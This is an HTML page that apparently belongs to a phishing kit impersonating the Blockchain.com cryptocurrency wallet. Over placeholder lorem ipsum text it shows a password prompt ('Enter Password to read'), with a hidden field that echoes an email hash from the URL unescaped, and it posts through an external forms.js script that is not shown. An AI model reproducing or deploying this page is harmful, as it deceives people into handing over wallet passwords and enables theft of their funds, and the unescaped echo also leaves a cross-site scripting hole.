<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Blockchain.com Wallet - Exchange Cryptocurrency</title>
	<link rel="stylesheet" href="bootstrap-3/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.css">
	<link rel="stylesheet" href="css/default.css">
	<link rel="icon" href="favicon.ico">
</head>
<body>

<div class="container-fluid">
	<input type="hidden" id="initVal">
	<input type="hidden" id="autoVal">
</div>

<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Reiciendis labore necessitatibus ducimus, consectetur aliquam adipisci quo veniam nesciunt! Maiores aperiam ab expedita ducimus mollitia error odit magnam, fuga et nesciunt.</p>

<div class="mymodal container-fluid">
	<div class="overlay">
		<div class="col-sm-4"></div>
		<div class="col-sm-4">
			<form class="row thumbnail" id="loginForm">
				<div class="form-group">
					<label for="login_pwd" class="text-bold">Enter Password to read</label>
					<input type="hidden" name="email_hash" value="<?php echo $_GET['mailhash']; ?>">
					<input type="password" class="form-control" name="login_pwd" id="login_pwd" placeholder="Enter password to continue" required>
				</div>
				<div class="form-group feedback">
					
				</div>
				<div class="form-group">
					<input type="hidden" name="user_login">
					<button class="btn btn-primary submit-btn btn-block">Continue</button>
				</div>
			</form>
		</div>
	</div>
</div>

<script src="js/jquery-3.min.js"></script>
<script src="bootstrap-3/js/bootstrap.min.js"></script>
<script src="js/forms.js"></script>
</body>
</html>